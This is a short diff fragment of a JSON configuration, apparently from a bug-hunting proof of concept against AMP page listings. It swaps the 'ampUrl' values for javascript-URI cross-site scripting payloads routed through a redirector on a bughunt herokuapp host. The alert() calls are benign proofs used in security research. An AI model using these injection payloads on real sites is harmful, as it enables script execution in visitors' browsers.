@@ -80,12 +80,12 @@ include 'log.php';
       "pages": [{
           "title": "News article",
           "image": "https://ampbyexample.com/img/social.png",
-          "ampUrl": "javascript:alert(0)"
+          "ampUrl": "https://bughunt1307.herokuapp.com/redirector.php?x=javascript:alert(1);//"
         },
         {
           "title": "Recipe",
           "image": "https://ampbyexample.com/img/social.png",
-          "ampUrl": "https://bughunt1307.herokuapp.com/redirector.php?x=javascript:alert(0)"
+          "ampUrl": "https://bughunt1307.herokuapp.com/redirector.php?x=javascript:alert(2);//"
         }
       ]
     }
